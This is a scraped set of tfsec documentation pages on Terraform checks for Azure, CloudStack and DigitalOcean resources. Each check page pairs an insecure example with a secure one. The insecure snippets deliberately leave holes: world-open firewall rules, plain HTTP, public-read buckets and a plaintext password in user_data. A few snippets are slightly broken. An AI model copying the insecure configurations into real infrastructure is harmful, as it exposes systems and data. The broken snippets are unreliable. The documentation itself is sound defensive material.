{\n     logging {\n         delete                = true\n         read                  = true\n         write                 = true\n         version               = \"1.0\"\n         retention_policy_days = 10\n     }\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#logging](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#logging){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet](https://docs.microsoft.com/en-us/azure/storage/common/storage-analytics-logging?tabs=dotnet){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:54.669504"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/storage/use-secure-tls-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/storage/use-secure-tls-policy/index.md", "content": "---\ntitle: The minimum TLS version for Storage Accounts should be TLS1_2\n---\n\n# The minimum TLS version for Storage Accounts should be TLS1_2\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nAzure Storage currently supports three versions of the TLS protocol: 1.0, 1.1, and 1.2. \n\nAzure Storage uses TLS 1.2 on public HTTPS endpoints, but TLS 1.0 and TLS 1.1 are still supported for backward compatibility.\n\nThis check will warn if the minimum TLS is not set to TLS1_2.\n\n### Possible Impact\nThe TLS version being outdated and has known vulnerabilities\n\n### Suggested Resolution\nUse a more recent TLS/SSL policy for the load balancer\n\n\n### Insecure Example\n\nThe following example will fail the azure-storage-use-secure-tls-policy check.\n```terraform\n\n resource \"azurerm_storage_account\" \"bad_example\" {\n   name                     = \"storageaccountname\"\n   resource_group_name      = azurerm_resource_group.example.name\n   location                 = azurerm_resource_group.example.location\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-storage-use-secure-tls-policy check.\n```terraform\n\n resource \"azurerm_storage_account\" \"good_example\" {\n   name                     = \"storageaccountname\"\n   resource_group_name      = azurerm_resource_group.example.name\n   location                 = azurerm_resource_group.example.location\n   min_tls_version          = \"TLS1_2\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#min_tls_version](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/storage_account#min_tls_version){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/storage/common/transport-layer-security-configure-minimum-version](https://docs.microsoft.com/en-us/azure/storage/common/transport-layer-security-configure-minimum-version){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:54.950704"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/synapse/virtual-network-enabled/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/synapse/virtual-network-enabled/index.md", "content": "---\ntitle: Synapse Workspace should have managed virtual network enabled, the default is disabled.\n---\n\n# Synapse Workspace should have managed virtual network enabled, the default is disabled.\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nSynapse Workspace does not have managed virtual network enabled by default.\n\nWhen you create your Azure Synapse workspace, you can choose to associate it to a Microsoft Azure Virtual Network. The Virtual Network associated with your workspace is managed by Azure Synapse. This Virtual Network is called a Managed workspace Virtual Network.\nManaged private endpoints are private endpoints created in a Managed Virtual Network associated with your Azure Synapse workspace. Managed private endpoints establish a private link to Azure resources. You can only use private links in a workspace that has a Managed workspace Virtual Network.\n\n### Possible Impact\nYour Synapse workspace is not using the private endpoints\n\n### Suggested Resolution\nSet manage virtual network to enabled\n\n\n### Insecure Example\n\nThe following example will fail the azure-synapse-virtual-network-enabled check.\n```terraform\n\n resource \"azurerm_synapse_workspace\" \"bad_example\" {\n   name                                 = \"example\"\n   resource_group_name                  = azurerm_resource_group.example.name\n   location                             = azurerm_resource_group.example.location\n   storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n   sql_administrator_login              = \"sqladminuser\"\n   sql_administrator_login_password     = \"H@Sh1CoR3!\"\n \n   aad_admin {\n     login     = \"AzureAD Admin\"\n     object_id = \"00000000-0000-0000-0000-000000000000\"\n     tenant_id = \"00000000-0000-0000-0000-000000000000\"\n   }\n \n   tags = {\n     Env = \"production\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-synapse-virtual-network-enabled check.\n```terraform\n\n resource \"azurerm_synapse_workspace\" \"good_example\" {\n   name                                 = \"example\"\n   resource_group_name                  = azurerm_resource_group.example.name\n   location                             = azurerm_resource_group.example.location\n   storage_data_lake_gen2_filesystem_id = azurerm_storage_data_lake_gen2_filesystem.example.id\n   sql_administrator_login              = \"sqladminuser\"\n   sql_administrator_login_password     = \"H@Sh1CoR3!\"\n   managed_virtual_network_enabled\t   = true\n   aad_admin {\n     login     = \"AzureAD Admin\"\n     object_id = \"00000000-0000-0000-0000-000000000000\"\n     tenant_id = \"00000000-0000-0000-0000-000000000000\"\n   }\n \n   tags = {\n     Env = \"production\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/synapse_workspace#managed_virtual_network_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/synapse_workspace#managed_virtual_network_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/synapse-analytics/security/synapse-workspace-managed-private-endpoints](https://docs.microsoft.com/en-us/azure/synapse-analytics/security/synapse-workspace-managed-private-endpoints){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/synapse-analytics/security/synapse-workspace-managed-vnet](https://docs.microsoft.com/en-us/azure/synapse-analytics/security/synapse-workspace-managed-vnet){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:55.523342"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/cloudstack/compute/no-sensitive-info/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/cloudstack/compute/no-sensitive-info/index.md", "content": "---\ntitle: No sensitive data stored in user_data\n---\n\n# No sensitive data stored in user_data\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nWhen creating instances, user data can be used during the initial configuration. User data must not contain sensitive information\n\n### Possible Impact\nSensitive credentials in the user data can be leaked\n\n### Suggested Resolution\nDon't use sensitive data in the user data section\n\n\n### Insecure Example\n\nThe following example will fail the cloudstack-compute-no-sensitive-info check.\n```terraform\n\n resource \"cloudstack_instance\" \"web\" {\n   name             = \"server-1\"\n   service_offering = \"small\"\n   network_id       = \"6eb22f91-7454-4107-89f4-36afcdf33021\"\n   template         = \"CentOS 6.5\"\n   zone             = \"zone-1\"\n   user_data        = <<EOF\n export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n EOF\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the cloudstack-compute-no-sensitive-info check.\n```terraform\n\n resource \"cloudstack_instance\" \"web\" {\n   name             = \"server-1\"\n   service_offering = \"small\"\n   network_id       = \"6eb22f91-7454-4107-89f4-36afcdf33021\"\n   template         = \"CentOS 6.5\"\n   zone             = \"zone-1\"\n   user_data        = <<EOF\n export GREETING=\"Hello there\"\n EOF\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/cloudstack/latest/docs/resources/instance#](https://registry.terraform.io/providers/hashicorp/cloudstack/latest/docs/resources/instance#){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:56.292329"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/compute/enforce-https/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/compute/enforce-https/index.md", "content": "---\ntitle: The load balancer forwarding rule is using an insecure protocol as an entrypoint\n---\n\n# The load balancer forwarding rule is using an insecure protocol as an entrypoint\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nPlain HTTP is unencrypted and human-readable. This means that if a malicious actor was to eavesdrop on your connection, they would be able to see all of your data flowing back and forth.\n\nYou should use HTTPS, which is HTTP over an encrypted (TLS) connection, meaning eavesdroppers cannot read your traffic.\n\n### Possible Impact\nYour inbound traffic is not protected\n\n### Suggested Resolution\nSwitch to HTTPS to benefit from TLS security features\n\n\n### Insecure Example\n\nThe following example will fail the digitalocean-compute-enforce-https check.\n```terraform\n\n resource \"digitalocean_loadbalancer\" \"bad_example\" {\n   name   = \"bad_example-1\"\n   region = \"nyc3\"\n \n   forwarding_rule {\n     entry_port     = 80\n     entry_protocol = \"http\"\n \n     target_port     = 80\n     target_protocol = \"http\"\n   }\n \n   droplet_ids = [digitalocean_droplet.web.id]\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the digitalocean-compute-enforce-https check.\n```terraform\n\n resource \"digitalocean_loadbalancer\" \"bad_example\" {\n   name   = \"bad_example-1\"\n   region = \"nyc3\"\n   \n   forwarding_rule {\n \tentry_port     = 443\n \tentry_protocol = \"https\"\n   \n \ttarget_port     = 443\n \ttarget_protocol = \"https\"\n   }\n   \n   droplet_ids = [digitalocean_droplet.web.id]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/loadbalancer](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/loadbalancer){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.digitalocean.com/products/networking/load-balancers/](https://docs.digitalocean.com/products/networking/load-balancers/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:57.047090"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/compute/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/compute/index.md", "content": "---\ntitle: compute\n---\n\n# compute\n\n## Checks\n\n\n- [enforce-https](enforce-https) The load balancer forwarding rule is using an insecure protocol as an entrypoint\n\n- [kubernetes-auto-upgrades-not-enabled](kubernetes-auto-upgrades-not-enabled) Kubernetes clusters should be auto-upgraded to ensure that they always contain the latest security patches.\n\n- [no-public-egress](no-public-egress) The firewall has an outbound rule with open access\n\n- [no-public-ingress](no-public-ingress) The firewall has an inbound rule with open access\n\n- [surge-upgrades-not-enabled](surge-upgrades-not-enabled) The Kubernetes cluster does not enable surge upgrades\n\n- [use-ssh-keys](use-ssh-keys) SSH Keys are the preferred way to connect to your droplet, no keys are supplied\n\n\n\n", "timestamp": "2025-10-24T22:24:57.174382"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/compute/kubernetes-auto-upgrades-not-enabled/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/compute/kubernetes-auto-upgrades-not-enabled/index.md", "content": "---\ntitle: Kubernetes clusters should be auto-upgraded to ensure that they always contain the latest security patches.\n---\n\n# Kubernetes clusters should be auto-upgraded to ensure that they always contain the latest security patches.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\n\n\n### Possible Impact\nNot running the latest security patches on your Kubernetes cluster can make it a target for penetration.\n\n### Suggested Resolution\nSet maintenance policy deterministically when auto upgrades are enabled\n\n\n### Insecure Example\n\nThe following example will fail the digitalocean-compute-kubernetes-auto-upgrades-not-enabled check.\n```terraform\n\nresource \"digitalocean_kubernetes_cluster\" \"foo\" {\n\tname    \t = \"foo\"\n\tregion  \t = \"nyc1\"\n\tversion \t = \"1.20.2-do.0\"\n\tauto_upgrade = false\n\n\tnode_pool {\n\t\tname       = \"autoscale-worker-pool\"\n\t\tsize       = \"s-2vcpu-2gb\"\n\t\tauto_scale = true\n\t\tmin_nodes  = 1\n\t\tmax_nodes  = 5\n\t}\n}\n\n```\n\n\n\n### Secure Example\n\nThe following example will pass the digitalocean-compute-kubernetes-auto-upgrades-not-enabled check.\n```terraform\n\nresource \"digitalocean_kubernetes_cluster\" \"foo\" {\n\tname    \t = \"foo\"\n\tregion  \t = \"nyc1\"\n\tversion \t = \"1.20.2-do.0\"\n\tauto_upgrade = true\n\n\tnode_pool {\n\t\tname       = \"autoscale-worker-pool\"\n\t\tsize       = \"s-2vcpu-2gb\"\n\t\tauto_scale = true\n\t\tmin_nodes  = 1\n\t\tmax_nodes  = 5\n\t}\n}\n\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/kubernetes_cluster#auto-upgrade-example](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/kubernetes_cluster#auto-upgrade-example){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.digitalocean.com/products/kubernetes/resources/best-practices/](https://docs.digitalocean.com/products/kubernetes/resources/best-practices/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:57.429856"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/compute/no-public-egress/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/compute/no-public-egress/index.md", "content": "---\ntitle: The firewall has an outbound rule with open access\n---\n\n# The firewall has an outbound rule with open access\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nOpening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.\n\n### Possible Impact\nThe port is exposed for ingress from the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the digitalocean-compute-no-public-egress check.\n```terraform\n\n resource \"digitalocean_firewall\" \"bad_example\" {\n \tname = \"only-22-80-and-443\"\n   \n \tdroplet_ids = [digitalocean_droplet.web.id]\n   \n \toutbound_rule {\n \t  protocol         = \"tcp\"\n \t  port_range       = \"22\"\n \t  destination_addresses = [\"0.0.0.0/0\", \"::/0\"]\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the digitalocean-compute-no-public-egress check.\n```terraform\n\n resource \"digitalocean_firewall\" \"good_example\" {\n \tname = \"only-22-80-and-443\"\n   \n \tdroplet_ids = [digitalocean_droplet.web.id]\n   \n \toutbound_rule {\n \t  protocol         = \"tcp\"\n \t  port_range       = \"22\"\n \t  destination_addresses = [\"192.168.1.0/24\", \"fc00::/7\"]\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/firewall](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/firewall){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.digitalocean.com/products/networking/firewalls/how-to/configure-rules/](https://docs.digitalocean.com/products/networking/firewalls/how-to/configure-rules/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:57.745789"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/compute/no-public-ingress/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/compute/no-public-ingress/index.md", "content": "---\ntitle: The firewall has an inbound rule with open access\n---\n\n# The firewall has an inbound rule with open access\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nOpening up ports to connect out to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that are explicitly required where possible.\n\n### Possible Impact\nYour port is exposed to the internet\n\n### Suggested Resolution\nSet a more restrictive CIRDR range\n\n\n### Insecure Example\n\nThe following example will fail the digitalocean-compute-no-public-ingress check.\n```terraform\n\n resource \"digitalocean_firewall\" \"bad_example\" {\n \tname = \"only-22-80-and-443\"\n   \n \tdroplet_ids = [digitalocean_droplet.web.id]\n   \n \tinbound_rule {\n \t  protocol         = \"tcp\"\n \t  port_range       = \"22\"\n \t  source_addresses = [\"0.0.0.0/0\", \"::/0\"]\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the digitalocean-compute-no-public-ingress check.\n```terraform\n\n resource \"digitalocean_firewall\" \"good_example\" {\n \tname = \"only-22-80-and-443\"\n   \n \tdroplet_ids = [digitalocean_droplet.web.id]\n   \n \tinbound_rule {\n \t  protocol         = \"tcp\"\n \t  port_range       = \"22\"\n \t  source_addresses = [\"192.168.1.0/24\", \"fc00::/7\"]\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/firewall](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/firewall){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.digitalocean.com/products/networking/firewalls/how-to/configure-rules/](https://docs.digitalocean.com/products/networking/firewalls/how-to/configure-rules/){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:58.034386"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/compute/surge-upgrades-not-enabled/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/compute/surge-upgrades-not-enabled/index.md", "content": "---\ntitle: The Kubernetes cluster does not enable surge upgrades\n---\n\n# The Kubernetes cluster does not enable surge upgrades\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nWhile upgrading your cluster, workloads will temporarily be moved to new nodes. A small cost will follow, but as a bonus, you won't experience downtime.\n\n### Possible Impact\nUpgrades may influence availability of your Kubernetes cluster\n\n### Suggested Resolution\nEnable surge upgrades in your Kubernetes cluster\n\n\n### Insecure Example\n\nThe following example will fail the digitalocean-compute-surge-upgrades-not-enabled check.\n```terraform\n\nresource \"digitalocean_kubernetes_cluster\" \"surge_upgrade_bad\" {\n\tname   = \"foo\"\n\tregion = \"nyc1\"\n\tversion = \"1.20.2-do.0\"\n\tsurge_upgrade = false\n\t\n\tnode_pool {\n\t\tname       = \"worker-pool\"\n\t\tsize       = \"s-2vcpu-2gb\"\n\t\tnode_count = 3\n\t\n\t\ttaint {\n\t\t\tkey    = \"workloadKind\"\n\t\t\tvalue  = \"database\"\n\t\t\teffect = \"NoSchedule\"\n\t\t}\n\t}\n}\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the digitalocean-compute-surge-upgrades-not-enabled check.\n```terraform\n\nresource \"digitalocean_kubernetes_cluster\" \"surge_upgrade_good\" {\n\tname   = \"foo\"\n\tregion = \"nyc1\"\n\tversion = \"1.20.2-do.0\"\n\tsurge_upgrade = true\n\n\tnode_pool {\n\t\tname       = \"worker-pool\"\n\t\tsize       = \"s-2vcpu-2gb\"\n\t\tnode_count = 3\n\t\n\t\ttaint {\n\t\t\tkey    = \"workloadKind\"\n\t\t\tvalue  = \"database\"\n\t\t\teffect = \"NoSchedule\"\n\t\t}\n\t}\n}\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/kubernetes_cluster#surge_upgrade](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/kubernetes_cluster#surge_upgrade){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.digitalocean.com/products/kubernetes/how-to/upgrade-cluster/#surge-upgrades](https://docs.digitalocean.com/products/kubernetes/how-to/upgrade-cluster/#surge-upgrades){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:58.320194"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/compute/use-ssh-keys/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/compute/use-ssh-keys/index.md", "content": "---\ntitle: SSH Keys are the preferred way to connect to your droplet, no keys are supplied\n---\n\n# SSH Keys are the preferred way to connect to your droplet, no keys are supplied\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nWhen working with a server, you’ll likely spend most of your time in a terminal session connected to your server through SSH. A more secure alternative to password-based logins, SSH keys use encryption to provide a secure way of logging into your server and are recommended for all users.\n\n### Possible Impact\nLogging in with username and password is easier to compromise\n\n### Suggested Resolution\nUse ssh keys for login\n\n\n### Insecure Example\n\nThe following example will fail the digitalocean-compute-use-ssh-keys check.\n```terraform\n\n resource \"digitalocean_droplet\" \"good_example\" {\n \timage    = \"ubuntu-18-04-x64\"\n \tname     = \"web-1\"\n \tregion   = \"nyc2\"\n \tsize     = \"s-1vcpu-1gb\"\n  }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the digitalocean-compute-use-ssh-keys check.\n```terraform\n\n data \"digitalocean_ssh_key\" \"terraform\" {\n \tname = \"myKey\"\n   }\n   \n resource \"digitalocean_droplet\" \"good_example\" {\n \timage    = \"ubuntu-18-04-x64\"\n \tname     = \"web-1\"\n \tregion   = \"nyc2\"\n \tsize     = \"s-1vcpu-1gb\"\n \tssh_keys = [ data.digitalocean_ssh_key.myKey.id ]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/droplet#ssh_keys](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/droplet#ssh_keys){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://www.digitalocean.com/community/tutorials/understanding-the-ssh-encryption-and-connection-process](https://www.digitalocean.com/community/tutorials/understanding-the-ssh-encryption-and-connection-process){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:58.593350"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/spaces/acl-no-public-read/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/spaces/acl-no-public-read/index.md", "content": "---\ntitle: Spaces bucket or bucket object has public read acl set\n---\n\n# Spaces bucket or bucket object has public read acl set\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nSpace bucket and bucket object permissions should be set to deny public access unless explicitly required.\n\n### Possible Impact\nThe contents of the space can be accessed publicly\n\n### Suggested Resolution\nApply a more restrictive ACL\n\n\n### Insecure Example\n\nThe following example will fail the digitalocean-spaces-acl-no-public-read check.\n```terraform\n\n resource \"digitalocean_spaces_bucket\" \"bad_example\" {\n   name   = \"public_space\"\n   region = \"nyc3\"\n   acl    = \"public-read\"\n }\n \n resource \"digitalocean_spaces_bucket_object\" \"index\" {\n   region       = digitalocean_spaces_bucket.bad_example.region\n   bucket       = digitalocean_spaces_bucket.bad_example.name\n   key          = \"index.html\"\n   content      = \"<html><body><p>This page is empty.</p></body></html>\"\n   content_type = \"text/html\"\n   acl          = \"public-read\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the digitalocean-spaces-acl-no-public-read check.\n```terraform\n\n resource \"digitalocean_spaces_bucket\" \"good_example\" {\n   name   = \"private_space\"\n   region = \"nyc3\"\n   acl    = \"private\"\n }\n   \n resource \"digitalocean_spaces_bucket_object\" \"index\" {\n   region       = digitalocean_spaces_bucket.good_example.region\n   bucket       = digitalocean_spaces_bucket.good_example.name\n   key          = \"index.html\"\n   content      = \"<html><body><p>This page is empty.</p></body></html>\"\n   content_type = \"text/html\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket#acl](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket#acl){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket_object#acl](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket_object#acl){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.digitalocean.com/reference/api/spaces-api/#access-control-lists-acls](https://docs.digitalocean.com/reference/api/spaces-api/#access-control-lists-acls){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:59.160643"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/spaces/disable-force-destroy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/spaces/disable-force-destroy/index.md", "content": "---\ntitle: Force destroy is enabled on Spaces bucket which is dangerous\n---\n\n# Force destroy is enabled on Spaces bucket which is dangerous\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nEnabling force destroy on a Spaces bucket means that the bucket can be deleted without the additional check that it is empty. This risks important data being accidentally deleted by a bucket removal process.\n\n### Possible Impact\nAccidental deletion of bucket objects\n\n### Suggested Resolution\nDon't use force destroy on bucket configuration\n\n\n### Insecure Example\n\nThe following example will fail the digitalocean-spaces-disable-force-destroy check.\n```terraform\n\n resource \"digitalocean_spaces_bucket\" \"bad_example\" {\n   name   \t\t= \"foobar\"\n   region \t\t= \"nyc3\"\n   force_destroy = true\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the digitalocean-spaces-disable-force-destroy check.\n```terraform\n\n resource \"digitalocean_spaces_bucket\" \"good_example\" {\n   name   = \"foobar\"\n   region = \"nyc3\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket#force_destroy](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket#force_destroy){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:59.459510"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/spaces/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/spaces/index.md", "content": "---\ntitle: spaces\n---\n\n# spaces\n\n## Checks\n\n\n- [acl-no-public-read](acl-no-public-read) Spaces bucket or bucket object has public read acl set\n\n- [disable-force-destroy](disable-force-destroy) Force destroy is enabled on Spaces bucket which is dangerous\n\n- [versioning-enabled](versioning-enabled) Spaces buckets should have versioning enabled\n\n\n\n", "timestamp": "2025-10-24T22:24:59.579438"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/digitalocean/spaces/versioning-enabled/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/digitalocean/spaces/versioning-enabled/index.md", "content": "---\ntitle: Spaces buckets should have versioning enabled\n---\n\n# Spaces buckets should have versioning enabled\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nVersioning is a means of keeping multiple variants of an object in the same bucket. You can use the Spaces (S3) Versioning feature to preserve, retrieve, and restore every version of every object stored in your buckets. With versioning you can recover more easily from both unintended user actions and application failures.\n\n### Possible Impact\nDeleted or modified data would not be recoverable\n\n### Suggested Resolution\nEnable versioning to protect against accidental or malicious removal or modification\n\n\n### Insecure Example\n\nThe following example will fail the digitalocean-spaces-versioning-enabled check.\n```terraform\n\n resource \"digitalocean_spaces_bucket\" \"bad_example\" {\n   name   = \"foobar\"\n   region = \"nyc3\"\n }\n \n resource \"digitalocean_spaces_bucket\" \"bad_example\" {\n   name   = \"foobar\"\n   region = \"nyc3\"\n \n   versioning {\n \tenabled = false\t\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the digitalocean-spaces-versioning-enabled check.\n```terraform\n\n resource \"digitalocean_spaces_bucket\" \"good_example\" {\n   name   = \"foobar\"\n   region = \"nyc3\"\n \n   versioning {\n \tenabled = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket#versioning](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs/resources/spaces_bucket#versioning){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:59.860064"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/general/secrets/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/general/secrets/index.md", "content": "---\ntitle: secrets\n---\n\n# secrets\n\n## Checks\n\n\n- [no-plaintext-exposure](no-plaintext-exposure) Secret/sensitive data should not be exposed in plaintext.\n\n- [no-plaintext-exposure](no-plaintext-exposure) Secret/sensitive data should not be exposed in plaintext.\n\n- [no-plaintext-exposure](no-plaintext-exposure) Secret/sensitive data should not be exposed in plaintext.\n\n- [no-plaintext-exposure](no-plaintext-exposure) Secret/sensitive data should not be exposed in plaintext.\n\n- [no-plaintext-exposure](no-plaintext-exposure) Secret/sensitive data should not be exposed in plaintext.\n\n\n\n", "timestamp": "2025-10-24T22:25:00.384257"}
